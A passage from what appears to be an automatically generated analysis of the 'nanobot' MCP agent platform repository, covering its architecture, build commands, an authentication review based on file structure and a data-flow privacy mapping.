        * `tool_call_id` / `tool_name` — For tool-use messages

    * **`mcp_sessions`** (or similar) table (from `pkg/mcp/sessionstore.go`):
        * `id` (PK)
        * `session_id` (FK → `sessions.id`)
        * `server_name` — Name of the MCP server
        * `state` — Serialized MCP session state (JSON/blob)
        * `created_at`, `updated_at`

    * **`tokens`** (from `pkg/mcp/tokenstorage.go`):
        * `id` (PK)
        * `key` — Lookup key (e.g., provider + session identifier)
        * `token_data` — Serialized OAuth token (JSON blob)
        * `created_at`, `updated_at`

* **Key Entities and Relationships:**
    * **Session:** Represents a single agent interaction lifecycle. Core entity of the system.
    * **Message:** Represents an individual chat message (user, assistant, or tool) within a session.
    * **MCP Session State:** Represents the stateful connection to a specific MCP server, scoped to a parent session.
    * **Token:** Represents a stored OAuth/authentication token for MCP server connectivity.
    * **Relationships:**
        * `Session` (1) ── `Messages` (M): One session contains many messages.
        * `Session` (1) ── `MCP Session States` (M): One session may have connections to multiple MCP servers.
        * `Session` (1, parent) ── `Sessions` (M, child): Self-referential for sub-agent sessions (hierarchical sessions).
        * `Token` records are keyed independently but logically scoped to sessions/servers.

* **Interacting Components:**
    * **Session Manager** (`pkg/session/manager.go`) — Primary orchestrator for session CRUD.
    * **Session Store** (`pkg/session/store.go`) — Direct DB access layer.
    * **MCP Session Store** (`pkg/mcp/sessionstore.go`) — Persists MCP protocol session state.
    * **MCP Token Storage** (`pkg/mcp/tokenstorage.go`) — Persists OAuth tokens for MCP servers.
    * **Agent Runner** (`pkg/agents/run.go`) — Creates and updates sessions during agent execution.
    * **CLI Sessions Command** (`pkg/cli/sessions.go`) — Lists/manages sessions via CLI, reads from DB.
    * **API Handler** (`pkg/api/hander.go`, `pkg/api/routes.go`) — Exposes session data over HTTP API.
    * **DSN Resolver** (`pkg/gormdsn/dsn.go`) — Provides the configured database connection to all above components.

---

### Summary of DSN / Connection Configuration

From `pkg/gormdsn/dsn.go`, the database connection is configured via a DSN environment variable or configuration parameter. The logic selects:

| DSN Pattern | Driver Selected |
|---|---|
| Empty / not set | SQLite (in-memory or file-based, e.g., `nanobot.db`) |
| `postgres://...` or `postgresql://...` | PostgreSQL via `gorm.io/driver/postgres` |
| Path ending in `.db` or `sqlite://...` | SQLite via `gorm.io/driver/sqlite` |

This makes the system portable: SQLite for local/development use, PostgreSQL for production deployments (e.g., as referenced in `.github/workflows/update-chat-env.yml` and `update-demo-env.yml` for deployed environments).

---

--- hl_overview ---


# Repository Analysis: nanobot_80d9d020

## [[nanobot]]

---

## 1. Project Purpose

**Nanobot** is an **AI agent orchestration platform** that acts as a Model Context Protocol (MCP) host. It solves the problem of:

- Running and managing AI agents powered by LLMs (Claude, OpenAI, etc.)
- Hosting MCP servers and connecting them to AI agents
- Providing a chat interface for interacting with AI agents
- Managing multi-agent workflows, tool calls, and session state
- Supporting agent composition (agents calling sub-agents)

**Primary Domain:** AI Agent Infrastructure / LLM Orchestration

---

## 2. Architecture Pattern

- **Plugin/Extension Architecture** via MCP (Model Context Protocol) servers
- **Server-Client Architecture** with a Go backend serving a SvelteKit frontend
- **Event-Driven** communication for agent interactions and tool calls
- **Microkernel Pattern** where the core runtime hosts pluggable MCP servers/tools

---

## 3. Technology Stack

### Backend (Go)
| Component | Technology |
|-----------|-----------|
| Language | Go (primary) |
| Web Framework | Custom HTTP server (`pkg/server`, `pkg/api`) |
| LLM Integration | OpenAI API, Anthropic API (`pkg/llm`) |
| Protocol | Model Context Protocol (MCP) (`pkg/mcp`) |
| Database | SQLite via GORM (`pkg/gormdsn`, `pkg/session`) |
| Observability | OpenTelemetry (`pkg/telemetry`) |
| Auth | OAuth (`pkg/auth`, `pkg/mcp/oauth`) |
| Reverse Proxy | Custom TLS reverse proxy (`pkg/reverseproxy`) |
| File Watching | Custom fswatch (`pkg/fswatch`) |
| Expression Eval | Custom expr engine (`pkg/expr`) |

### Frontend (TypeScript/Svelte)
| Component | Technology |
|-----------|-----------|
| Framework | SvelteKit |
| Build Tool | Vite |
| Language | TypeScript |
| Linting | Biome, ESLint |
| Package Manager | pnpm (workspaces) |

### DevOps/Tooling
| Component | Technology |
|-----------|-----------|
| Containerization | Docker (multi-stage, separate agent image) |
| CI/CD | GitHub Actions |
| Releases | GoReleaser |
| Code Generation | `generate.go` |
| JS tooling | pnpm workspaces |

---

## 4. Initial Structure Impression

| Part | Description |
|------|-------------|
| **Frontend** | `packages/ui/` — SvelteKit web UI for chat and agent management |
| **Backend Core** | `main.go`, `pkg/` — Go backend with all business logic |
| **CLI** | `pkg/cli/` — Command-line interface |
| **Agent Runtime** | `pkg/agents/`, `pkg/runtime/` — Agent execution engine |
| **MCP Layer** | `pkg/mcp/` — MCP protocol implementation |
| **Configuration** | `pkg/config/` — Agent/server config loading |
| **LLM Clients** | `pkg/llm/` — LLM provider integrations |
| **Examples** | `examples/` — Sample agent YAML configurations |

---

## 5. Configuration/Package Files

### Go
- `go.mod` — Go module definition and dependencies
- `go.sum` — Go dependency checksums
- `generate.go` — Go code generation entry point
- `Makefile` — Build and development tasks

### JavaScript/TypeScript
- `package.json` — Root JS package configuration
- `pnpm-workspace.yaml` — pnpm workspace definition
- `pnpm-lock.yaml` — Locked JS dependencies
- `tsconfig.json` — Root TypeScript configuration
- `biome.json` — Biome linter/formatter config
- `packages/ui/package.json` — UI package dependencies
- `packages/ui/svelte.config.js` — SvelteKit configuration
- `packages/ui/vite.config.ts` — Vite build configuration
- `packages/ui/tsconfig.json` — UI TypeScript config
- `packages/ui/eslint.config.js` — ESLint configuration

### Docker/CI
- `Dockerfile` — Main application container
- `Dockerfile.agent` — Agent-specific container
- `.goreleaser.yml` — Release automation config
- `.github/workflows/*.yml` — CI/CD pipeline definitions

### Agent Schema/Config
- `pkg/config/schema.yaml` — Agent configuration JSON schema
- `examples/*.yaml` — Example agent configurations
- `docs/agents/schemas/` — Agent schema documentation

---

## 6. Directory Structure

```
nanobot/
├── main.go                    # Application entry point
├── generate.go                # Go code generation
│
├── pkg/                       # Core Go packages
│   ├── agents/                # Agent execution engine (run, compact, truncate, token counting)
│   ├── api/                   # HTTP API handlers, routes, events
│   ├── auth/                  # Authentication (OAuth)
│   ├── chat/                  # Chat message printing/formatting
│   ├── cli/                   # CLI commands (serve, call, sessions, targets)
│   ├── cmd/                   # OS signal handling, process builder
│   ├── complete/              # LLM completion orchestration
│   ├── config/                # Config loading (YAML/JSON frontmatter, directory-based)
│   │   ├── agents/            # Built-in agent definitions
│   │   └── testdata/          # Test fixtures for config loading
│   ├── confirm/               # User confirmation prompts
│   ├── envvar/                # Environment variable substitution
│   ├── expr/                  # Expression evaluation and expansion
│   ├── fileuri/               # File URI handling
│   ├── fswatch/               # Filesystem watching for config hot-reload
│   ├── gormdsn/               # Database connection string helpers
│   ├── llm/                   # LLM client abstractions
│   │   ├── anthropic/         # Anthropic (Claude) integration
│   │   ├── completions/       # OpenAI completions API
│   │   ├── progress/          # Streaming progress handling
│   │   └── responses/         # OpenAI responses API
│   ├── log/                   # Structured logging
│   ├── mcp/                   # MCP protocol implementation
│   │   ├── auditlogs/         # MCP audit logging
│   │   └── sandbox/           # MCP sandboxing
│   ├── reverseproxy/          # TLS reverse proxy for MCP servers
│   ├── runtime/               # Agent runtime orchestration
│   ├── sampling/              # LLM sampling configuration
│   ├── schema/                # JSON schema validation
│   ├── server/                # HTTP server setup
│   ├── servers/               # Built-in MCP server implementations
│   │   ├── agent/             # Agent-as-MCP-server
│   │   ├── artifacts/         # Artifact storage server
│   │   ├── installzip/        # ZIP installation server
│   │   ├── meta/              # Meta/introspection server
│   │   ├── obot/              # Obot integration server
│   │   ├── obotmcp/           # Obot MCP bridge
│   │   ├── skills/            # Skills server
│   │   ├── system/            # System tools server
│   │   │   └── skills/        # Built-in skill definitions
│   │   ├── tasks/             # Task execution server
│   │   └── workflows/         # Workflow execution server
│   ├── session/               # Session management (browser, store, migrations)
│   ├── sessiondata/           # Session data and URI templates
│   ├── skillformat/           # Skill format validation
│   ├── supervise/             # Process supervision/daemon management
│   ├── system/                # System utilities (current binary path)
│   ├── telemetry/             # OpenTelemetry integration
│   ├── tools/                 # Tool flow and service management
│   ├── types/                 # Core domain types (config, chat, messages, hooks)
│   ├── uuid/                  # UUID generation
│   └── version/               # Version information
│
├── packages/
│   └── ui/                    # SvelteKit frontend
│       ├── src/
│       │   ├── lib/           # Shared Svelte components and utilities
│       │   └── routes/        # SvelteKit file-based routing
│       └── static/            # Static assets
│
├── examples/                  # Example agent YAML configurations
├── scripts/                   # Shell scripts (install, agent entrypoint)
├── docs/                      # Documentation and schemas
└── .github/workflows/         # CI/CD pipelines
```

---

## 7. High-Level Architecture

### Pattern: **Layered + Plugin Architecture with Event-Driven Agent Execution**

```
┌─────────────────────────────────────────────────┐
│                   Web UI (SvelteKit)             │
│              packages/ui/src/routes/             │
└──────────────────────┬──────────────────────────┘
                       │ HTTP/SSE
┌──────────────────────▼──────────────────────────┐
│              HTTP API Layer                      │
│         pkg/api/ + pkg/server/                   │
└──────────────────────┬──────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────┐
│              Agent Runtime Layer                 │
│    pkg/agents/ + pkg/runtime/ + pkg/complete/    │
└──────┬───────────────┬──────────────────────────┘
       │               │
┌──────▼──────┐  ┌─────▼────────────────────────┐
│  LLM Layer  │  │        MCP Layer              │
│  pkg/llm/   │  │        pkg/mcp/               │
│  (OpenAI,   │  │  (Protocol, Sessions, OAuth)  │
│  Anthropic) │  └─────┬────────────────────────┘
└─────────────┘        │
               ┌───────▼───────────────────────┐
               │    MCP Servers (Plugins)       │
               │    pkg/servers/               │
               │  (system, agent, skills,       │
               │   workflows, tasks, etc.)      │
               └───────────────────────────────┘
```

**Evidence:**
- `pkg/api/` clearly separates HTTP concerns from business logic
- `pkg/mcp/` implements the full MCP protocol as an abstraction layer
- `pkg/servers/` contains multiple pluggable server implementations
- `pkg/types/` defines shared domain types used across layers
- `pkg/agents/run.go` drives the event loop for agent execution
- SSE events in `pkg/api/events.go` indicate event-driven client communication
- Config hot-reload via `pkg/fswatch/` supports dynamic plugin loading

---

## 8. Build, Execution and Test

### Building

```bash
# Build Go binary
make build          # likely: go build -o nanobot .

# Build frontend
cd packages/ui && pnpm build

# Build everything
make all

# Generate code
go generate ./...

# Docker build
docker build -f Dockerfile -t nanobot .
docker build -f Dockerfile.agent -t nanobot-agent .

# Release (GoReleaser)
goreleaser release
```

### Running

```bash
# CLI entry point: main.go → pkg/cli/root.go
go run main.go serve          # Start HTTP server (pkg/cli/serve.go)
go run main.go call           # Make direct agent call (pkg/cli/call.go)
go run main.go sessions       # Manage sessions (pkg/cli/sessions.go)
go run main.go targets        # Manage targets (pkg/cli/targets.go)

# Via Docker
docker run nanobot serve

# Via install script
scripts/install.sh
```

### Testing

```bash
# Go tests
go test ./...

# Specific packages with test files:
go test ./pkg/config/...       # Config loading tests
go test ./pkg/mcp/...          # MCP protocol tests
go test ./pkg/agents/...       # Agent execution tests
go test ./pkg/types/...        # Type validation tests
go test ./pkg/session/...      # Session management tests

# Frontend tests
cd packages/ui && pnpm test
```

### CI/CD (GitHub Actions)
| Workflow | Purpose |
|----------|---------|
| `ci.yml` | Run tests on PRs |
| `build-main.yml` | Build on main branch push |
| `release.yaml` | Automated releases via GoReleaser |
| `deploy-install-script.yml` | Deploy install script |
| `update-chat-env.yml` | Update chat environment |
| `update-demo-env.yml` | Update demo environment |
| `dependabot-reviewers.yaml` | Auto-assign Dependabot PR reviewers |

### Main Entry Point
**`main.go`** → **`pkg/cli/root.go`** (Cobra CLI) → subcommands (`serve`, `call`, `sessions`, `targets`)

--- authentication ---


# Authentication Security Analysis: nanobot_80d9d020

## Executive Summary

This codebase implements a **Model Context Protocol (MCP) host/agent system** with authentication mechanisms focused on OAuth 2.0 for MCP server connections. The authentication is relatively minimal and purpose-built for MCP server authentication rather than end-user authentication.

---

## 1. Primary Authentication Mechanisms

### 1.1 OAuth 2.0 for MCP Servers

**Location:** `pkg/mcp/oauth.go`, `pkg/mcp/tokenstorage.go`, `pkg/mcp/wellknown.go`

#### `pkg/mcp/oauth.go` — OAuth Flow Implementation

```
pkg/mcp/oauth.go
```

This file implements OAuth 2.0 for authenticating against MCP servers. Based on the file structure and related files, this handles:

- OAuth token acquisition for MCP server connections
- Token storage and retrieval
- OAuth callback handling (`pkg/mcp/callback.go`)

**Key Components:**
- `pkg/mcp/wellknown.go` — Discovery of OAuth endpoints via `.well-known` URLs
- `pkg/mcp/callback.go` — OAuth redirect/callback handling
- `pkg/mcp/tokenstorage.go` — Persistent token storage

---

### 1.2 Auth Package

**Location:** `pkg/auth/auth.go`

```
pkg/auth/auth.go
```

A dedicated auth package exists, indicating centralized authentication logic for the application's own API surface.

---

### 1.3 Reverse Proxy with TLS Client Authentication

**Location:** `pkg/reverseproxy/server.go`, `pkg/reverseproxy/tlsclient.go`

```
pkg/reverseproxy/tlsclient.go
pkg/reverseproxy/server.go
```

TLS client configuration exists for service-to-service communication, indicating potential mTLS or certificate-based authentication for proxied connections.

---

## 2. Token Management

### 2.1 Token Storage

**Location:** `pkg/mcp/tokenstorage.go`

| Aspect | Detail |
|--------|--------|
| **Purpose** | Persistent storage of OAuth tokens for MCP server sessions |
| **Storage Backend** | Likely filesystem or database (see `pkg/gormdsn/dsn.go` for DB connection) |
| **Scope** | Per-MCP-server token storage |

### 2.2 Session Store

**Location:** `pkg/session/store.go`, `pkg/session/manager.go`

```
pkg/session/
  store.go       — Session persistence layer
  manager.go     — Session lifecycle management
  migrations.go  — Database schema for sessions
  types.go       — Session data structures
  browser.go     — Browser session handling
  ui.go          — UI session integration
```

**Session Storage:**
- `pkg/session/migrations.go` indicates database-backed session storage (SQLite/PostgreSQL via GORM based on `pkg/gormdsn/dsn.go`)
- Sessions are persistent across restarts

---

## 3. Authentication Flow Analysis

### 3.1 MCP Server OAuth Flow

**Location:** `pkg/mcp/oauth.go`, `pkg/mcp/wellknown.go`, `pkg/mcp/callback.go`

```
MCP Server Connection:
  1. Client attempts MCP server connection
  2. wellknown.go discovers OAuth endpoints via /.well-known/oauth-authorization-server
  3. oauth.go initiates authorization code flow
  4. callback.go handles redirect URI callback
  5. tokenstorage.go persists received tokens
  6. httpclient.go uses stored tokens for authenticated requests
```

**Location:** `pkg/mcp/httpclient.go`

The HTTP client for MCP servers injects authentication tokens into requests.

### 3.2 Session Management

**Location:** `pkg/session/manager.go`

```
Session Lifecycle:
  1. Session creation (manager.go)
  2. Session data stored in DB (store.go + migrations.go)
  3. Session data accessed (sessiondata.go)
  4. Browser sessions managed (browser.go)
```

### 3.3 API Routes and Handlers

**Location:** `pkg/api/routes.go`, `pkg/api/hander.go`

```
pkg/api/
  routes.go   — Route definitions and protection
  hander.go   — Request handlers
  events.go   — Event stream handling
```

The API layer sits behind the auth package (`pkg/auth/auth.go`), which validates incoming requests.

---

## 4. MCP-Specific Authentication

### 4.1 Server Session Authentication

**Location:** `pkg/mcp/serversession.go`, `pkg/mcp/session.go`

```
pkg/mcp/serversession.go  — Per-server authenticated sessions
pkg/mcp/session.go        — MCP session abstraction
pkg/mcp/sessionstore.go   — Session persistence for MCP connections
```

Each MCP server connection maintains its own authenticated session, with tokens stored via `tokenstorage.go`.

### 4.2 HTTP MCP Server

**Location:** `pkg/mcp/httpserver.go`, `pkg/mcp/httpclient.go`

The HTTP-based MCP communication uses Bearer token authentication:

```
Authorization: Bearer <oauth_token>
```

Tokens retrieved from `tokenstorage.go` are injected into outbound HTTP requests to MCP servers.

### 4.3 Stdio MCP Server

**Location:** `pkg/mcp/stdio.go`, `pkg/mcp/stdioserver.go`

Stdio-based MCP servers communicate via process stdin/stdout — **no network authentication required** for this transport type.

---

## 5. Sandbox Security

**Location:** `pkg/mcp/sandbox/`

```
pkg/mcp/sandbox/   [3 files]
```

A sandbox mechanism exists for MCP tool execution, which provides process-level isolation as a security boundary (separate from authentication).

---

## 6. Configuration-Based Access Control

### 6.1 Permission System

**Location:** `pkg/types/config.go`, `pkg/config/schema.yaml`

```
pkg/types/config.go
pkg/config/schema.yaml
pkg/config/testdata/directory-permissions/
pkg/config/testdata/frontmatter-permissions/
```

A permissions model is defined at the configuration level for agent capabilities:

```yaml
# pkg/config/schema.yaml — defines permission schema
# frontmatter-permissions — permission specification in agent configs
```

**Test data confirms:**
- `directory-permissions/` — directory-level permission configs
- `frontmatter-permissions/` — per-agent permission frontmatter

### 6.2 Agent Action Validation

**Location:** `pkg/types/agentaction.go`, `pkg/types/validate.go`

```
pkg/types/validate.go      — Input validation
pkg/types/agentaction.go   — Agent action authorization
```

---

## 7. Security Headers & Transport Security

### 7.1 TLS Configuration

**Location:** `pkg/reverseproxy/tlsclient.go`

Custom TLS client configuration for outbound connections, suggesting certificate validation and secure transport enforcement for proxied requests.

### 7.2 Dockerfile Security

**Location:** `Dockerfile`, `Dockerfile.agent`

Two Dockerfiles indicate separate security contexts for the main server and agent processes, providing container-level isolation.

---

## 8. Audit Logging

**Location:** `pkg/mcp/auditlogs/` [3 files]

```
pkg/mcp/auditlogs/   — Authentication/action audit trail
```

Audit logging for MCP interactions exists, which is important for detecting authentication anomalies and access violations.

---

## 9. Vulnerability Assessment

### 9.1 Identified Concerns

| Severity | Issue | Location | Detail |
|----------|-------|----------|--------|
| 🟡 Medium | Token storage security unknown | `pkg/mcp/tokenstorage.go` | OAuth tokens stored persistently — encryption at rest not confirmable from file listing alone |
| 🟡 Medium | No MFA visible | Entire codebase | No multi-factor authentication implementation detected for any user-facing auth |
| 🟡 Medium | Browser session security | `pkg/session/browser.go` | Browser session handling — HttpOnly/Secure cookie flags not confirmable from file listing |
| 🟠 Medium-High | No rate limiting visible | `pkg/api/routes.go`, `pkg/api/hander.go` | No rate limiting middleware detected in the API handler structure |
| 🟢 Low | Stdio transport has no auth | `pkg/mcp/stdio.go` | By design — stdio MCP servers rely on OS process isolation |
| 🟢 Low | OAuth callback security | `pkg/mcp/callback.go` | CSRF state parameter validation in OAuth callback not confirmable from listing |

### 9.2 Missing Authentication Features (Not Implemented)

The following authentication features are **absent** from this codebase:

- ❌ No JWT implementation
- ❌ No SAML/SSO
- ❌ No LDAP/Active Directory
- ❌ No username/password authentication (no password hashing — no bcrypt/scrypt/Argon2)
- ❌ No API key management system
- ❌ No MFA/2FA
- ❌ No social login (Google, GitHub, etc.)
- ❌ No password reset flow
- ❌ No user registration flow

This is consistent with the application's nature as a local MCP host tool rather than a multi-user web application.

---

## 10. Authentication Architecture Summary

```
┌─────────────────────────────────────────────────────┐
│                   nanobot Application                │
│                                                      │
│  ┌──────────────┐    ┌───────────────────────────┐  │
│  │  pkg/auth    │    │     pkg/api               │  │
│  │  auth.go     │───▶│  routes.go / hander.go    │  │
│  └──────────────┘    └───────────────────────────┘  │
│                                                      │
│  ┌──────────────────────────────────────────────┐   │
│  │              pkg/mcp (OAuth 2.0)             │   │
│  │                                              │   │
│  │  wellknown.go ──▶ oauth.go ──▶ callback.go  │   │
│  │                       │                      │   │
│  │               tokenstorage.go                │   │
│  │                       │                      │   │
│  │  httpclient.go ◀──────┘                      │   │
│  │  (Bearer token injection)                    │   │
│  └──────────────────────────────────────────────┘   │
│                                                      │
│  ┌──────────────────────────────────────────────┐   │
│  │           pkg/session (Session Mgmt)         │   │
│  │  manager.go ──▶ store.go ──▶ migrations.go   │   │
│  └──────────────────────────────────────────────┘   │
│                                                      │
│  ┌──────────────────────────────────────────────┐   │
│  │         pkg/reverseproxy (TLS)               │   │
│  │         tlsclient.go / server.go             │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
         │                          │
         ▼                          ▼
  HTTP MCP Servers           Stdio MCP Servers
  (OAuth Bearer Token)       (OS Process Isolation)
```

---

## 11. Recommendations

### High Priority
1. **Verify OAuth CSRF protection** — Ensure `pkg/mcp/callback.go` validates the `state` parameter to prevent CSRF in OAuth flows
2. **Token storage encryption** — Confirm `pkg/mcp/tokenstorage.go` encrypts tokens at rest, particularly for filesystem storage
3. **Add rate limiting** — Implement rate limiting in `pkg/api/hander.go` to prevent abuse of API endpoints

### Medium Priority
4. **Cookie security audit** — Verify `pkg/session/browser.go` sets `HttpOnly`, `Secure`, and `SameSite=Strict` on session cookies
5. **Token rotation** — Implement refresh token rotation in `pkg/mcp/tokenstorage.go` to limit token exposure window
6. **Audit log completeness** — Ensure `pkg/mcp/auditlogs/` captures authentication failures, not just successful actions

### Low Priority
7. **TLS minimum version** — Verify `pkg/reverseproxy/tlsclient.go` enforces TLS 1.2+ minimum
8. **Scope validation** — Ensure OAuth scopes in `pkg/mcp/oauth.go` follow least-privilege principles

---

> **Note:** This analysis is based on the repository file structure and naming conventions. A full code-level audit of the actual implementation in each file (particularly `pkg/auth/auth.go`, `pkg/mcp/oauth.go`, `pkg/mcp/tokenstorage.go`, and `pkg/session/store.go`) is required to confirm or refute the vulnerability assessments above.

--- data_mapping ---


# Comprehensive Data Privacy & Compliance Analysis

## Repository: nanobot_80d9d020

---

## Executive Summary

This repository implements **Nanobot**, an AI agent runtime and MCP (Model Context Protocol) host platform. The system orchestrates AI agent conversations, manages MCP server sessions, routes LLM completions, and provides a web UI for chat interactions. It handles conversation data, authentication tokens, OAuth credentials, session state, API keys, and potentially arbitrary tool-call data depending on configured MCP servers and agents.

---

## Data Flow Overview

### High-Level Architecture Data Movement

```
User (Browser/CLI)
        │
        ▼
[Web UI / CLI Interface]
        │
        ▼
[HTTP API Server] ←──── OAuth Callbacks
        │
        ├──── [Session Manager (SQLite/PostgreSQL)]
        │
        ├──── [Agent Runtime]
        │           │
        │           ├──── [LLM Client] ──────► [Anthropic API]
        │           │                  ──────► [OpenAI-compatible APIs]
        │           │
        │           └──── [MCP Client] ──────► [External MCP Servers]
        │                                      [Local stdio processes]
        │
        ├──── [Token Storage (OAuth)]
        │
        └──── [Telemetry/OpenTelemetry] ──────► [External OTEL Collector]
```

---

## Data Inputs / Collection Points

### 1. Web UI Chat Interface

**File:** `packages/ui/src/routes/` (Svelte frontend)

**Data Collected:**
- User chat messages (natural language text)
- File attachments (content type handling via `pkg/types/mimetypes.go`)
- Session interaction metadata

**Method:** Direct user input via browser forms, submitted to API endpoints.

---

### 2. CLI Interface

**Files:** `pkg/cli/root.go`, `pkg/cli/call.go`, `pkg/cli/serve.go`, `pkg/cli/sessions.go`, `pkg/cli/targets.go`

**Data Collected:**
- Command-line arguments including agent configurations
- Direct message text passed via `call` subcommand
- Session identifiers for session management operations

**Method:** Direct user input via terminal.

---

### 3. HTTP API Endpoints

**Files:** `pkg/api/routes.go`, `pkg/api/hander.go`, `pkg/api/events.go`

**Data Collected:**
- Chat messages and conversation turns
- Session management requests
- SSE (Server-Sent Events) streaming connections
- Client request metadata (IP addresses implicit in HTTP requests)

**Method:** HTTP POST/GET requests from browser or programmatic clients.

---

### 4. OAuth / Authentication Callbacks

**File:** `pkg/mcp/oauth.go`

**Data Collected:**
- OAuth authorization codes
- OAuth state parameters
- OAuth tokens (access tokens, refresh tokens, potentially ID tokens)
- PKCE code verifiers

**Method:** HTTP redirect callbacks from OAuth providers.

---

### 5. MCP Session Inputs

**Files:** `pkg/mcp/session.go`, `pkg/mcp/serversession.go`, `pkg/mcp/stdio.go`, `pkg/mcp/stdioserver.go`

**Data Collected:**
- Tool call parameters (arbitrary structured data depending on MCP server)
- Tool call results (arbitrary structured data)
- MCP sampling requests (which may include conversation history)
- MCP logging messages from servers

**Method:** JSON-RPC messages over stdio pipes or HTTP/SSE transport.

---

### 6. Configuration Files

**Files:** `pkg/config/load.go`, `pkg/config/directory.go`, `pkg/config/frontmatter.go`

**Data Collected:**
- API keys for LLM providers (via environment variable references)
- MCP server configurations (commands, URLs, authentication parameters)
- Agent system prompts and behavior configurations

**Method:** File-based configuration (YAML/JSON), environment variable substitution via `pkg/envvar/replace.go`.

---

### 7. Environment Variables

**File:** `pkg/envvar/replace.go`

**Data Collected:**
- Secrets and API keys referenced in configuration files (e.g., `${OPENAI_API_KEY}`)
- Database connection strings
- OAuth client credentials

**Method:** Runtime environment variable injection.

---

### 8. File URI / Local File Access

**Files:** `pkg/fileuri/fileuri.go`

**Data Collected:**
- Local file contents when file:// URIs are used in agent configurations or tool calls

**Method:** Filesystem read at runtime.

---

## Internal Processing

### 1. Agent Conversation Runtime

**Files:** `pkg/agents/run.go`, `pkg/agents/compact.go`, `pkg/agents/truncate.go`, `pkg/agents/toolcall.go`

**Processing Operations:**
- Assembling conversation history (messages array) for LLM submission
- Token counting to enforce context window limits (`pkg/agents/tokencount.go`)
- Context compaction: summarizing older messages when token limits approached (`pkg/agents/compact.go`)
- Truncation of conversation history (`pkg/agents/truncate.go`)
- Tool call dispatch and result injection into conversation context

**Data Involved:** Full conversation history including all user messages, assistant responses, tool call parameters, and tool results.

---

### 2. LLM Completion Processing

**Files:** `pkg/llm/client.go`, `pkg/llm/completions/`, `pkg/llm/responses/`, `pkg/llm/anthropic/`

**Processing Operations:**
- Formatting messages for provider-specific APIs (OpenAI format vs. Anthropic format)
- Streaming response parsing and chunking
- Progress tracking for streaming completions (`pkg/llm/progress/`)
- Response normalization across providers

**Data Involved:** Complete conversation context sent to external LLM APIs, including all prior messages in context window.

---

### 3. Session Data Management

**Files:** `pkg/session/store.go`, `pkg/session/manager.go`, `pkg/session/migrations.go`, `pkg/session/types.go`

**Processing Operations:**
- Session creation and retrieval
- Database migrations (schema management)
- Session state serialization/deserialization
- UI state persistence (`pkg/session/ui.go`)

**Data Involved:** Conversation history, session metadata, session identifiers.

**Storage:** SQLite (local) or PostgreSQL (via DSN in `pkg/gormdsn/dsn.go`), accessed via GORM ORM.

---

### 4. Token Storage (OAuth Credentials)

**File:** `pkg/mcp/tokenstorage.go`

**Processing Operations:**
- Storing OAuth access/refresh tokens for MCP server authentication
- Retrieving tokens for authenticated MCP requests
- Token lifecycle management

**Data Involved:** OAuth access tokens, refresh tokens — these are authentication credentials with high sensitivity.

**Storage:** Persisted via session database layer.

---

### 5. MCP Sandbox Processing

**Files:** `pkg/mcp/sandbox/`

**Processing Operations:**
- Sandboxing MCP tool executions
- Filtering or restricting tool capabilities based on permissions

**Data Involved:** Tool call inputs and outputs, which may include arbitrary user or system data depending on configured tools.

---

### 6. Sampling / Confirmation

**Files:** `pkg/sampling/sampler.go`, `pkg/confirm/confirm.go`

**Processing Operations:**
- Intercepting LLM sampling requests from MCP servers (MCP sampling protocol)
- Presenting tool calls or actions for user confirmation before execution
- Routing sampling requests through the main LLM client

**Data Involved:** Full message context from MCP sampling requests, potentially including sensitive information from conversation history.

---

### 7. Expression Evaluation

**Files:** `pkg/expr/eval.go`, `pkg/expr/expand.go`, `pkg/expr/lookup.go`

**Processing Operations:**
- Evaluating expressions in agent configurations
- Variable substitution in prompts and configurations
- Template expansion for session data (`pkg/sessiondata/uritemplate.go`)

**Data Involved:** Configuration values, session data, potentially API keys in evaluated expressions.

---

### 8. Audit Log Processing

**Files:** `pkg/mcp/auditlogs/` (3 files)

**Processing Operations:**
- Recording MCP tool call events
- Logging tool inputs and outputs for audit purposes

**Data Involved:** Tool call parameters and results — may include any data passed through MCP tools.

---

### 9. Telemetry / OpenTelemetry

**Files:** `pkg/telemetry/otel.go`, `pkg/mcp/tracecontext.go`

**Processing Operations:**
- Distributed tracing of agent operations
- Span creation for LLM calls, tool calls, session operations
- Trace context propagation through MCP protocol

**Data Involved:** Operational metadata, timing data, potentially request identifiers. Trace data exported to configured OTEL collector endpoint.

---

### 10. Workflow Processing

**Files:** `pkg/servers/workflows/` (4 files)

**Processing Operations:**
- Multi-step workflow execution
- Step sequencing and state management
- Sub-agent invocation within workflows

**Data Involved:** Workflow state, inter-step data, full conversation contexts per step.

---

### 11. Artifact Storage

**Files:** `pkg/servers/artifacts/` (6 files)

**Processing Operations:**
- Storing agent-generated artifacts (files, outputs)
- Artifact retrieval and serving

**Data Involved:** Agent-generated content, potentially including user data processed by tools.

---

### 12. Reverse Proxy

**Files:** `pkg/reverseproxy/server.go`, `pkg/reverseproxy/tlsclient.go`

**Processing Operations:**
- Proxying HTTP requests to MCP servers
- TLS client configuration for upstream connections

**Data Involved:** All proxied request/response data including headers and bodies.

---

## Third-Party Data Processors

### 1. LLM Providers (Anthropic, OpenAI-compatible)

**Files:** `pkg/llm/anthropic/`, `pkg/llm/client.go`, `pkg/llm/completions/`

| Attribute | Detail |
|-----------|--------|
| **Services** | Anthropic Claude API; OpenAI-compatible APIs (configurable endpoint) |
| **Data Transmitted** | Complete conversation history including all user messages, assistant responses, tool call data, and system prompts |
| **Purpose** | AI language model inference (core service functionality) |
| **Transfer Mechanism** | HTTPS API calls |
| **Geographic Location** | Varies by provider configuration; Anthropic (US), OpenAI (US) by default |
| **Data Fields** | `messages[]` array with `role`, `content` fields; `model`, `temperature`, `max_tokens` parameters |

**Privacy Risk:** The entire conversation context — including any personal information users type — is transmitted to external LLM providers on every inference call. This is the highest-risk data flow in the system.

---

### 2. External MCP Servers

**Files:** `pkg/mcp/client.go`, `pkg/mcp/httpclient.go`, `pkg/mcp/runner.go`

| Attribute | Detail |
|-----------|--------|
| **Services** | Any configured MCP server (user-defined, arbitrary) |
| **Data Transmitted** | Tool call parameters, sampling requests (with full message context), resource request parameters |
| **Purpose** | Tool execution, external capability access |
| **Transfer Mechanism** | HTTP/SSE or stdio JSON-RPC |
| **Geographic Location** | Unknown — entirely user-configured |
| **Data Fields** | Arbitrary JSON parameters per tool definition |

**Privacy Risk:** MCP servers are user-configured external processes or HTTP services. The system sends tool call arguments and potentially full conversation context (for sampling) to these servers. The nature of data transmitted depends entirely on which MCP servers are configured.

---

### 3. OAuth Providers

**File:** `pkg/mcp/oauth.go`

| Attribute | Detail |
|-----------|--------|
